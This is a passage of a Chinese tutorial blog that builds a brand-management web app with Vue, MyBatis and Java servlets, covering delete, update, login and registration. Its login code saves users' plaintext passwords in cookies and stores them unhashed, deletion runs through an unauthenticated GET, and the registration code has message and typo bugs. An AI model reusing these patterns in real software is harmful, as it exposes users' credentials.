+<p>使用<code>scope.row.id</code>即可获取到每行数据的id</p>
+<h5 id="异步请求"><a href="#异步请求" class="headerlink" title="异步请求"></a>异步请求</h5><p>同样使用confirm组件提示用户是否真的想删除</p>
+<pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">deleteById</span>(<span class="hljs-params">id</span>)</span>&#123;
+             <span class="hljs-built_in">this</span>.$confirm(<span class="hljs-string">&#x27;确定删除吗？&#x27;</span>, <span class="hljs-string">&#x27;确认信息&#x27;</span>, &#123;
+                 distinguishCancelAndClose: <span class="hljs-literal">true</span>,
+                 confirmButtonText: <span class="hljs-string">&#x27;确定&#x27;</span>,
+                 cancelButtonText: <span class="hljs-string">&#x27;取消&#x27;</span>
+             &#125;).then(<span class="hljs-function">() =&gt;</span> &#123;
+                 <span class="hljs-built_in">this</span>.currentPage=<span class="hljs-number">1</span>
+                 <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;
+                 <span class="hljs-keyword">var</span> deleteId = id;
+                 axios(&#123;
+                     method: <span class="hljs-string">&#x27;get&#x27;</span>,
+                     url: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/deleteById?id=&#x27;</span>+deleteId,
+                 &#125;).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)</span>&#123;
+                     <span class="hljs-keyword">if</span>(response.data == <span class="hljs-string">&quot;success&quot;</span>)&#123;
+                         <span class="hljs-comment">// 重新查询数据</span>
+                         _this.selectAll();
+                         <span class="hljs-comment">//显示提示框</span>
+                         _this.$message(&#123;
+                             type: <span class="hljs-string">&#x27;success&#x27;</span>,
+                             message: <span class="hljs-string">&#x27;删除成功&#x27;</span>
+                         &#125;);
+                     &#125;
+                 &#125;)
+             &#125;).catch(<span class="hljs-function">() =&gt;</span> &#123;
+                 <span class="hljs-built_in">this</span>.$message(&#123;
+                     type: <span class="hljs-string">&#x27;info&#x27;</span>,
+                     message: <span class="hljs-string">&quot;取消删除&quot;</span>
+                 &#125;)
+             &#125;)
+         &#125;,</code></pre>
+
+<h3 id="7-修改"><a href="#7-修改" class="headerlink" title="7.修改"></a>7.修改</h3><h4 id="需求分析-6"><a href="#需求分析-6" class="headerlink" title="需求分析"></a>需求分析</h4><ul>
+<li>修改与添加类似，需要弹出对话框后进行数据的编辑</li>
+<li>如何获取每行的数据，使用<code>scope.row</code>即可</li>
+<li>请求数据为json数据，后台接收后将其转换为Brand类型后进行更新操作</li>
+</ul>
+<h4 id="后端实现-6"><a href="#后端实现-6" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-6"><a href="#dao-6" class="headerlink" title="dao"></a>dao</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 更新数据</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> brand</span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-meta">@Update(&quot;update tb_brand set brand_name = #&#123;brandName&#125;,company_name = #&#123;companyName&#125;,ordered = #&#123;ordered&#125;,description = #&#123;description&#125;,status = #&#123;status&#125; where id = #&#123;id&#125;&quot;)</span>
+<span class="hljs-meta">@ResultMap(&quot;brandResultMap&quot;)</span>
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(Brand brand)</span></span>;</code></pre>
+
+<h5 id="service-6"><a href="#service-6" class="headerlink" title="service"></a>service</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 更新数据</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> brand</span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(Brand brand)</span></span>&#123;
+    SqlSession sqlSession = sqlSessionFactory.openSession();
+    BrandMapper mapper = sqlSession.getMapper(BrandMapper.class);
+
+    mapper.update(brand);
+    sqlSession.commit();
+    sqlSession.close();
+&#125;</code></pre>
+
+<h5 id="servlet-6"><a href="#servlet-6" class="headerlink" title="servlet"></a>servlet</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 更新</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ServletException</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException</span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">update</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
+
+
+    BufferedReader reader = request.getReader();
+    String line = reader.readLine();
+    System.out.println(line);
+    Brand brand = JSON.parseObject(line, Brand.class);
+    System.out.println(brand);
+    service.update(brand);
+
+    response.getWriter().write(<span class="hljs-string">&quot;success&quot;</span>);
+&#125;</code></pre>
+
+<h4 id="前端实现-6"><a href="#前端实现-6" class="headerlink" title="前端实现"></a>前端实现</h4><h5 id="修改对话框"><a href="#修改对话框" class="headerlink" title="修改对话框"></a>修改对话框</h5><p>该对话框与增加对话的实现相同，不过该对话框初始时需要显示数据</p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;update(scope.row)&quot;</span> &gt;</span>修改<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></code></pre>
+
+<p>update函数的实现</p>
+<pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">update</span>(<span class="hljs-params">data</span>)</span>&#123;
+              <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;
+              <span class="hljs-built_in">this</span>.dialogUpdateVisible = <span class="hljs-literal">true</span>;
+              <span class="hljs-built_in">this</span>.updateBrand.brandName = data.brandName;
+              <span class="hljs-built_in">this</span>.updateBrand.companyName = data.companyName;
+              <span class="hljs-built_in">this</span>.updateBrand.status = data.status;
+              <span class="hljs-built_in">this</span>.updateBrand.ordered = data.ordered;
+              <span class="hljs-built_in">this</span>.updateBrand.description = data.description;
+              <span class="hljs-built_in">this</span>.updateBrand.statusStr = data.statusStr;
+          &#125;,</code></pre>
+
+<p>updateBrand定义</p>
+<pre><code class="hljs java">data() &#123;
+           <span class="hljs-keyword">return</span> &#123;
+               <span class="hljs-comment">//带修改的数据</span>
+               updateBrand:&#123;
+                   <span class="hljs-string">&quot;brandName&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,
+                   <span class="hljs-string">&quot;companyName&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,
+                   <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,
+                   <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>,
+                   <span class="hljs-string">&quot;ordered&quot;</span>: <span class="hljs-number">0</span>,
+                   <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-number">0</span>,
+                   <span class="hljs-string">&quot;statusStr&quot;</span>: <span class="hljs-string">&quot;&quot;</span>
+               &#125;,
+   &#125;</code></pre>
+
+<h5 id="异步请求实现"><a href="#异步请求实现" class="headerlink" title="异步请求实现"></a>异步请求实现</h5><p>修改对话框的提交按钮位置</p>
+<pre><code class="hljs html">
+<span class="hljs-tag">&lt;<span class="hljs-name">el-form-item</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;updateSubmit&quot;</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
+    <span class="hljs-comment">&lt;!--取消 只需要将dialogVisble设置为false即可隐藏对话框--&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;dialogUpdateVisible = false&quot;</span>&gt;</span>取消<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">el-form-item</span>&gt;</span></code></pre>
+
+<pre><code class="hljs js"><span class="hljs-comment">// 修改</span>
+<span class="hljs-function"><span class="hljs-title">updateSubmit</span>(<span class="hljs-params"></span>)</span>&#123;
+    <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;
+
+    axios(&#123;
+        method:<span class="hljs-string">&#x27;POST&#x27;</span>,
+        url: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/update&#x27;</span>,
+        data: _this.updateBrand
+    &#125;).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)</span>&#123;
+        <span class="hljs-keyword">if</span>(response.data == <span class="hljs-string">&quot;success&quot;</span>)&#123;
+            _this.dialogUpdateVisible = <span class="hljs-literal">false</span>;
+            _this.selectAll();
+            _this.msgbox(<span class="hljs-string">&quot;修改成功！&quot;</span>);
+        &#125;
+    &#125;)
+&#125;,</code></pre>
+
+
+
+<h2 id="登录注册功能实现"><a href="#登录注册功能实现" class="headerlink" title="登录注册功能实现"></a>登录注册功能实现</h2><h3 id="登录功能"><a href="#登录功能" class="headerlink" title="登录功能"></a>登录功能</h3><h4 id="后端实现-7"><a href="#后端实现-7" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-7"><a href="#dao-7" class="headerlink" title="dao"></a>dao</h5><p>在<code>src/main/java/com/itheima/mapper</code>创建<code>UserMapper</code>接口</p>
+<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.mapper;
+
+<span class="hljs-keyword">import</span> com.itheima.pojo.User;
+<span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Insert;
+<span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Param;
+<span class="hljs-keyword">import</span> org.apache.ibatis.annotations.Select;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserMapper</span> </span>&#123;
+    <span class="hljs-comment">/**</span>
+<span class="hljs-comment">     * 用户登录</span>
+<span class="hljs-comment">     * 检查用户名和密码是否正确</span>
+<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> username</span>
+<span class="hljs-comment">     * <span class="hljs-doctag">@param</span> password</span>
+<span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span>
+<span class="hljs-comment">     */</span>
+    <span class="hljs-meta">@Select(&quot;select * from tb_user where username = #&#123;username&#125; and password = #&#123;password&#125;&quot;)</span>
+    <span class="hljs-function">User <span class="hljs-title">select</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username, <span class="hljs-meta">@Param(&quot;password&quot;)</span> String password)</span></span>;
+
+&#125;
+</code></pre>
+
+<h5 id="service-7"><a href="#service-7" class="headerlink" title="service"></a>service</h5><p>在<code>src/main/java/com/itheima/service</code>中创建<code>UserService</code>类</p>
+<pre><code class="hljs java">SqlSessionFactory sqlSessionFactory = SqlSessionFactoryUtils.getSqlSessionFactory();
+
+<span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 用户登录方法</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> username</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> password</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">Login</span><span class="hljs-params">(String username, String password)</span></span>&#123;
+    SqlSession session = sqlSessionFactory.openSession();
+    UserMapper mapper = session.getMapper(UserMapper.class);
+    User user = mapper.select(username, password);
+
+    <span class="hljs-keyword">if</span>(user != <span class="hljs-keyword">null</span>)&#123;
+        <span class="hljs-keyword">return</span> user;
+    &#125;<span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
+    &#125;
+&#125;
+</code></pre>
+
+<h5 id="servlet-7"><a href="#servlet-7" class="headerlink" title="servlet"></a>servlet</h5><p>在<code>src/main/java/com/itheima/servler/web</code>中创建<code>LoginServlet</code></p>
+<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.web.servlet;
+
+<span class="hljs-keyword">import</span> com.itheima.pojo.User;
+<span class="hljs-keyword">import</span> com.itheima.service.UserService;
+
+<span class="hljs-keyword">import</span> javax.servlet.ServletException;
+<span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;
+<span class="hljs-keyword">import</span> javax.servlet.http.*;
+<span class="hljs-keyword">import</span> java.io.IOException;
+
+<span class="hljs-meta">@WebServlet(value = &quot;/login&quot;)</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;
+    <span class="hljs-comment">// 因为BrandService可能多次用到 所以变成成员变量 减少创建的次数</span>
+    UserService userservice = <span class="hljs-keyword">new</span> UserService();
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
+
+
+        System.out.println(<span class="hljs-string">&quot;login&quot;</span>);
+        <span class="hljs-comment">//解决POST请求中文乱码问题</span>
+        request.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);
+
+        String username = request.getParameter(<span class="hljs-string">&quot;username&quot;</span>);
+        String password = request.getParameter(<span class="hljs-string">&quot;password&quot;</span>);
+
+        User user = userservice.Login(username, password);
+
+        <span class="hljs-keyword">if</span>(user != <span class="hljs-keyword">null</span>)&#123;
+            <span class="hljs-comment">// 登录成功，页面跳转到了 brand.jsp</span>
+            <span class="hljs-comment">// 保存用户的session信息</span>
+            <span class="hljs-comment">// 检查是否勾选记住密码</span>
+            String remember = request.getParameter(<span class="hljs-string">&quot;remember&quot;</span>);
+            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;1&quot;</span>.equals(remember))&#123;
+                Cookie c_username = <span class="hljs-keyword">new</span> Cookie(<span class="hljs-string">&quot;username&quot;</span>, username);
+                Cookie c_password = <span class="hljs-keyword">new</span> Cookie(<span class="hljs-string">&quot;password&quot;</span>, password);
+                c_username.setMaxAge(<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">7</span>);
+                c_password.setMaxAge(<span class="hljs-number">3600</span>*<span class="hljs-number">24</span>*<span class="hljs-number">7</span>);
+
+                <span class="hljs-comment">// 发送Cookie</span>
+                response.addCookie(c_username);
+                response.addCookie(c_password);
+            &#125;
+
+            HttpSession session = request.getSession();
+            session.setAttribute(<span class="hljs-string">&quot;user&quot;</span>, user);
+
+
+            <span class="hljs-comment">// 获取项目的虚拟路径</span>
+            String contextPath = request.getContextPath();
+            request.getRequestDispatcher( <span class="hljs-string">&quot;/brand.html&quot;</span>).forward(request,response);
+
+        &#125;<span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-comment">// 登录失败，在页面显示登录失败的提示信息</span>
+            request.setAttribute(<span class="hljs-string">&quot;login_msg&quot;</span>,<span class="hljs-string">&quot;用户名或密码错误&quot;</span>);
+            request.getRequestDispatcher(<span class="hljs-string">&quot;/login.jsp&quot;</span>).forward(request,response);
+        &#125;
+
+
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
+        doGet(request, response);
+    &#125;
+&#125;
+</code></pre>
+
+<h4 id="前端实现-7"><a href="#前端实现-7" class="headerlink" title="前端实现"></a>前端实现</h4><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loginDiv&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;height: 350px&quot;</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/brand-case/login&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span><span class="hljs-attr">id</span>=<span class="hljs-string">&quot;form&quot;</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loginMsg&quot;</span>&gt;</span>LOGIN IN<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;errorMsg&quot;</span>&gt;</span>$&#123;login_msg&#125; $&#123;register_msg&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Username:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;cookie.username.value&#125;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+
+        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Password:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;cookie.password.value&#125;&quot;</span><span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Remember:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;remember&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;remember&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;subDiv&quot;</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;login up&quot;</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;reset&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;reset&quot;</span>&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;register.jsp&quot;</span>&gt;</span>没有账号？<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></code></pre>
+
+
+
+<h3 id="注册功能"><a href="#注册功能" class="headerlink" title="注册功能"></a>注册功能</h3><h4 id="后端实现-8"><a href="#后端实现-8" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-8"><a href="#dao-8" class="headerlink" title="dao"></a>dao</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 查询是否存在相同的用户名</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> username</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-meta">@Select(&quot;select * from tb_user where username = #&#123;username&#125;&quot;)</span>
+<span class="hljs-function">User <span class="hljs-title">selectUser</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username)</span></span>;
+
+<span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 用户注册</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> user</span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-meta">@Insert(&quot;insert into tb_user values (null, #&#123;username&#125;, #&#123;password&#125;)&quot;)</span>
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addUser</span><span class="hljs-params">(User user)</span></span>;
+</code></pre>
+
+<h5 id="service-8"><a href="#service-8" class="headerlink" title="service"></a>service</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 注册功能</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> user</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">Register</span><span class="hljs-params">(User user)</span></span>&#123;
+    SqlSession session = sqlSessionFactory.openSession();
+    UserMapper mapper = session.getMapper(UserMapper.class);
+    User u = mapper.selectUser(user.getUsername());
+
+    <span class="hljs-keyword">if</span>(u == <span class="hljs-keyword">null</span>)&#123;
+        mapper.addUser(user);
+        session.commit();
+    &#125;
+    session.commit();
+    <span class="hljs-keyword">return</span> u == <span class="hljs-keyword">null</span>;
+&#125;</code></pre>
+
+<h5 id="servlet-8"><a href="#servlet-8" class="headerlink" title="servlet"></a>servlet</h5><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.web.servlet;
+
+<span class="hljs-keyword">import</span> com.itheima.pojo.User;
+<span class="hljs-keyword">import</span> com.itheima.service.UserService;
+
+<span class="hljs-keyword">import</span> javax.servlet.ServletException;
+<span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
+<span class="hljs-keyword">import</span> javax.servlet.http.HttpSession;
+<span class="hljs-keyword">import</span> java.io.IOException;
+
+<span class="hljs-meta">@WebServlet(value = &quot;/register&quot;)</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RegisterServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;
+    <span class="hljs-comment">// 因为UserService可能多次用到 所以变成成员变量 减少创建的次数</span>
+    UserService userservice = <span class="hljs-keyword">new</span> UserService();
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
+
+        <span class="hljs-comment">//解决POST请求中文乱码问题</span>
+        request.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);
+
+        String username = request.getParameter(<span class="hljs-string">&quot;username&quot;</span>);
+        String password = request.getParameter(<span class="hljs-string">&quot;password&quot;</span>);
+        String checkCode1 = request.getParameter(<span class="hljs-string">&quot;checkCode&quot;</span>);
+
+        User user = <span class="hljs-keyword">new</span> User();
+        user.setUsername(username);
+        user.setPassword(password);
+
+        <span class="hljs-comment">// 获取生成的验证码信息</span>
+        HttpSession session = request.getSession();
+        String checkCode =(String) session.getAttribute(<span class="hljs-string">&quot;checkCode&quot;</span>);
+        <span class="hljs-comment">// 比较用户输入的验证码</span>
+        <span class="hljs-comment">// 细节：checkCode为程序中定义的变量 比较时放在前面，否则可能出现空指针错误</span>
+        <span class="hljs-keyword">if</span>(!checkCode.equals(checkCode1))&#123;
+            request.setAttribute(<span class="hljs-string">&quot;register_msg&quot;</span>, <span class="hljs-string">&quot;验证码错误，请重新输入！&quot;</span>);
+            request.getRequestDispatcher(<span class="hljs-string">&quot;/register.jsp&quot;</span>).forward(request,response);
+            <span class="hljs-comment">// 禁止注册</span>
+            <span class="hljs-keyword">return</span> ;
+        &#125;
+
+
+        <span class="hljs-keyword">boolean</span> flag = userservice.Register(user);
+        <span class="hljs-keyword">if</span>(flag)&#123;
+            request.setAttribute(<span class="hljs-string">&quot;register_msg&quot;</span>,<span class="hljs-string">&quot;注册成功，请登录！&quot;</span>);
+            request.getRequestDispatcher(<span class="hljs-string">&quot;/login.jsp&quot;</span>).forward(request,response);
+        &#125;<span class="hljs-keyword">else</span>&#123;
+            request.setAttribute(<span class="hljs-string">&quot;register_msg&quot;</span>,<span class="hljs-string">&quot;注册成功，请重试！&quot;</span>);
+            request.getRequestDispatcher(<span class="hljs-string">&quot;/regsiter.jsp&quot;</span>).forward(request,response);
+        &#125;
+
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
+        doGet(request, response);
+    &#125;
+&#125;
+</code></pre>
+
+<h4 id="前端实现-8"><a href="#前端实现-8" class="headerlink" title="前端实现"></a>前端实现</h4><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-div&quot;</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;reg-content&quot;</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>欢迎注册<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>已有帐号？<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;login.jsp&quot;</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;reg-form&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/register&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span>
+
+        <span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span>
+
+            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>用户名<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inputs&quot;</span>&gt;</span>
+                    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span>
+                    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
+                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username_err&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;err_msg&quot;</span>&gt;</span>$&#123;register_msg&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
+                <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
+
+            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
+
+            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>密码<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;inputs&quot;</span>&gt;</span>
